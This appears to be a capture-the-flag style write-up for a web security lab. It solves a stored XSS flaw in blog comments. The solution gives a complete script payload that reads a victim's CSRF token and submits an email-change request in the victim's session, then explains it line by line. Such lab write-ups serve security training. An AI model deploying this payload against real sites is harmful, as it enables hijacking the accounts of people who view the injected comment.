# Description
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: ```wiener:peter```

<b>Hint</b>

> You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.


# Solution

In this task, we will need to steal the CSRF token and change the user's email address. Let's start by creating a payload.

```html
<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;

var data = new FormData();
data.append('csrf', token)
data.append('email', 'new@email.com');

fetch('/my-account/change-email', {
method: 'POST',
mode: 'no-cors',
body: data
});
});

</script>
```

```javascript 
window.addEventListener('DOMContentLoaded', function()
```
- Our entire function will only be executed after the page has fully loaded.

```javascript
var token = document.getElementsByName('csrf')[0].value;
```
 - Find the csrf token

```javascript
var data = new FormData();
data.append('csrf', token)
data.append('email', 'new@email.com');
```
 - Required data for sending a request

```javascript
fetch('/my-account/change-email', {
method: 'POST',
mode: 'no-cors',
body: data
```
 - send a POST request

<p align="center">
  <img src="https://github.com/CyberKRY/CTF-Writeups/blob/main/PortSwigger/Cross-site%20scripting/Images/XXS91.png" alt="XXS" />
</p>

Send a comment and complete the task
